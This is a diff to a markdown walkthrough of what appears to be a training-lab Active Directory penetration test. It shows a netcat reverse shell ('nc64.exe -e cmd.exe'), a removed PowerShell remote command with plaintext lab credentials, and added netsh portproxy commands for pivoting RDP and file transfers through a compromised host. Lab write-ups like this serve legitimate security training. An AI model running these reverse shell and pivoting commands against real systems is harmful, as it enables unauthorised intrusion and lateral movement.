@@ -128,10 +128,25 @@ First we upload the [netcat 64 bits for windows](https://github.com/vinsworldcom
 
 `nc -lnvp 8888` and `nc64.exe -e cmd.exe LIP LPORT` on the windows host.
 
-And now we test the remote connection with the second windows machine using this one liner command and the svc\_sql credentials obtained.
+And now we have to pivot using the box1.
+
+For that, we use the `netsh.exe`command learned on the **port forwarding with Windows Netsh** module in **PIVOTING, TUNNELING, AND PORT FORWARDING.**&#x20;
+
+#### To have a RDP connection from our attacking machinte to box2
+
+We execute on box1:
 
 ```
-Invoke-Command -ComputerName MS01.INLANEFREIGHT.LOCAL -Credential (New-Object PSCredential "svc_sql", (ConvertTo-SecureString "lucky7" -AsPlainText -Force)) -ScriptBlock { ipconfig }
+netsh interface portproxy add v4tov4 listenport=1515 listenaddress=10.129.139.26 connectport=3389 connectaddress=172.16.6.50
+```
 
+Were the lister port and listener adress are from our attacking machine, and the oders from the box 1
+
+#### To download files from our attacking machine in the box2
+
+Using the same logic, we use:
+
+```
+netsh.exe interface portproxy add v4tov4 listenport=8101 listenaddress=172.16.5.50 connectport=8100 connectaddress=10.10.14.221
 ```
 
